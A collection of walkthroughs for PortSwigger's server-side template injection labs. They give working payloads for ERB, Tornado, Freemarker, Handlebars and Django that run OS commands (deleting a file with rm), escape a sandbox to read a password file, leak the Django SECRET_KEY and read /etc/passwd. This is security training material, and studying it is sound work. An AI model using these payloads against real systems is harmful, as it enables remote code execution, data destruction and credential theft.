# Server-side template injection

As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets. 

## Basic server-side template injection

### Description

[This lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic) is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

### Proof of Concept

1. Notice that when you try to view more details about the first product, a GET request uses the message parameter to render "``Unfortunately this product is out of stock``" on the home page.
2. In the ERB documentation, discover that the syntax ``<%= someExpression %>`` is used to evaluate an expression and render the result on the page.
3. Use ERB template syntax to create a test payload containing a mathematical operation, for example:

```
<%= 7*7 %>
```

4. URL-encode this payload and insert it as the value of the ``message`` parameter in the URL as follows, remembering to replace ``lab-id`` with your own lab ID:

```
https://lab-id.web-security-academy.net/?message=<%25%3d+7*7+%25>
```

5. Load the URL in your browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability.
6. From the Ruby documentation, discover the ``system()`` method, which can be used to execute arbitrary operating system commands.
7. Construct a payload to delete Carlos's file:

```
<%= system("rm /home/carlos/morale.txt") %>
```

8. URL-encode the payload and insert it as the value of the message parameter, remembering to replace ``lab-id`` with your own lab ID:

```
https://lab-id.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

### Exploitability

An attacker will need to review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

----

## Basic server-side template injection (code context)

### Description

[This lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context) is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

### Proof of Concept

1. While proxying traffic through Burp, log in and post a comment on one of the blog posts.
2. Notice that on the "My account" page, you can select whether you want the site to use your full name, first name, or nickname. When you submit your choice, a ``POST`` request sets the value of the parameter ``blog-post-author-display`` to either ``user.name``, ``user.first_name``, or ``user.nickname``. When you load the page containing your comment, the name above your comment is updated based on the current value of this parameter.
3. In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely ``POST /my-account/change-blog-post-author-display``, and send it to Burp Repeater.
4. Study the Tornado documentation to discover that template expressions are surrounded with double curly braces, such as ``{{someExpression}}``. In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows:

```
blog-post-author-display=user.name}}{{7*7}}
```

5. Reload the page containing your test comment. Notice that the username now says ``Peter Wiener49}}``, indicating that a server-side template injection vulnerability may exist in the code context.
6. In the Tornado documentation, identify the syntax for executing arbitrary Python:

```
{% somePython %}
```

7. Study the Python documentation to discover that by importing the ``os`` module, you can use the ``system()`` method to execute arbitrary system commands.
8. Combine this knowledge to construct a payload that deletes Carlos's file:

```
{% import os %}
{{os.system('rm /home/carlos/morale.txt')
```

9. In Burp Repeater, go back to ``POST /my-account/change-blog-post-author-display``. Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows:

```
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

10. Reload the page containing your comment to execute the template and solve the lab.


### Exploitability

An attacker will need to review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory. An account with credentials `wiener:peter` is available.

----

## Server-side template injection using documentation

### Description

[This lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation) is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

### Proof of Concept

1. Log in and edit one of the product description templates. Notice that this template engine uses the syntax ``${someExpression}`` to render the result of an expression on the page. Either enter your own expression or change one of the existing ones to refer to an object that doesn't exist, such as ``${foobar}``, and save the template. The error message in the output shows that the Freemarker template engine is being used.
2. Study the Freemarker documentation and find that appendix contains an FAQs section with the question "Can I allow users to upload templates and what are the security implications?". The answer describes how the ``new()`` built-in can be dangerous.
3. Go to the "Built-in reference" section of the documentation and find the entry for `new()`. This entry further describes how `new()` is a security concern because it can be used to create arbitrary Java objects that implement the ``TemplateModel`` interface.
4. Load the JavaDoc for the ``TemplateModel`` class, and review the list of "All Known Implementing Classes".
5. Observe that there is a class called ``Execute``, which can be used to execute arbitrary shell commands
6. Either attempt to construct your own exploit, or use [@albinowax's exploit](https://portswigger.net/research/server-side-template-injection) and adapt it as follows:

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

7. Remove the invalid syntax that you entered earlier, and insert your new payload into the template.
8. Save the template and view the product page to solve the lab.

### Exploitability

An attacker will need to identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. An account is available: `content-manager:C0nt3ntM4n4g3r`.

----

## Server-side template injection in an unknown language with a documented exploit

### Description

[This lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit) is vulnerable to server-side template injection.

### Proof of Concept

1. Notice that when you try to view more details about the first product, a ``GET`` request uses the ``message`` parameter to render "``Unfortunately this product is out of stock``" on the home page.
2. Experiment by injecting a fuzz string containing template syntax from various different template languages, such as ``${{<%[%'"}}%\``, into the ``message`` parameter. Notice that when you submit invalid syntax, an error message is shown in the output. This identifies that the website is using Handlebars.
3. Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by ``@Zombiehelp54``.
4. Modify this exploit so that it calls ``require("child_process").exec("rm /home/carlos/morale.txt")`` as follows:

```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

5. URL encode your exploit and add it as the value of the message parameter in the URL. The final exploit should look like this, but remember to replace ``your-lab-id`` with your own lab ID:

```
https://your-lab-id.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

6. The lab should be solved when you load the URL.

### Exploitability

An attacker will need to identify the template engine and find a documented exploit online that can be used to execute arbitrary code, and to delete the `morale.txt` file from Carlos's home directory.

----

## Server-side template injection with information disclosure via user-supplied objects

### Description

[This lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects) is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data. 

### Proof of Concept

1. Log in and edit one of the product description templates.
2. Change one of the template expressions to something invalid, such as a fuzz string ``${{<%[%'"}}%\``, and save the template. The error message in the output hints that the Django framework is being used.
3. Study the Django documentation and notice that the built-in template tag ``debug`` can be called to display debugging information.
4. In the template, remove your invalid syntax and enter the following statement to invoke the ``debug`` built-in:

```
{% debug %}
```

5. Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the ``settings`` object.
6. Study the ``settings`` object in the Django documentation and notice that it contains a ``SECRET_KEY`` property, which has dangerous security implications if known to an attacker.
7. In the template, remove the ``{% debug %}`` statement and enter the expression 

```
{{settings.SECRET_KEY}}
```

8. Save the template to output the framework's secret key.
9. Click the "Submit solution" button and submit the secret key to solve the lab.

### Exploitability

An attacker will need to steal and submit the framework's secret key. An account is available: `content-manager:C0nt3ntM4n4g3r`.

----

## Server-side template injection in a sandboxed environment

### Description

[This lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment) uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox.

### Proof of Concept

1. Log in and edit one of the product description templates. Notice that you have access to the product object.
2. Load the JavaDoc for the Object class to find methods that should be available on all objects. Confirm that you can execute `${object.getClass()}` using the product object.
3. Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as:

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
    
4. Enter this payload in one of the templates and save. The output will contain the contents of the file as decimal ASCII code points.
5. Convert the returned bytes to ASCII.
6. Click the "Submit solution" button and submit this string to solve the lab.

### Exploitability

An attacker will need to break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file. An account is available: `content-manager:C0nt3ntM4n4g3r`.

----

## Server-side template injection with a custom exploit

### Description

 This lab is vulnerable to server-side template injection. 

### Proof of Concept

1. While proxying traffic through Burp, log in and post a comment on one of the blogs.
2. Go to the "My account" page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, as we saw in a previous lab. You should also have noticed that you have access to the user object.
3. Investigate the custom avatar functionality. Notice that when you upload an invalid image, the error message discloses a method called `user.setAvatar()`. Also take note of the file path `/home/carlos/User.php`. You will need this later.
4. Upload a valid image as your avatar and load the page containing your test comment.
5. In Burp Repeater, open the POST request for changing your preferred name and use the `blog-post-author-display` parameter to set an arbitrary file as your avatar:

```html
user.setAvatar('/etc/passwd')
```
    
6. Load the page containing your test comment to render the template. Notice that the error message indicates that you need to provide an image `MIME` type as the second argument. Provide this argument and view the comment again to refresh the template:

```html
user.setAvatar('/etc/passwd','image/jpg')
```
    
7. To read the file, load the avatar using `GET /avatar?avatar=wiener`. This will return the contents of the `/etc/passwd` file, confirming that you have access to arbitrary files.
8. Repeat this process to read the PHP file that you noted down earlier:

```html
user.setAvatar('/home/carlos/User.php','image/jpg')
```
    
9. In the PHP file, Notice that you have access to the `gdprDelete()` function, which deletes the user's avatar. You can combine this knowledge to delete Carlos's file.
10. First set the target file as your avatar, then view the comment to execute the template:

```html
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```
    
11. Invoke the `user.gdprDelete()` method and view your comment again to solve the lab.

### Exploitability

An attacker will need to create a custom exploit to delete the file `/.ssh/id_rsa` from Carlos's home directory. An account with credentials `wiener:peter` is available.
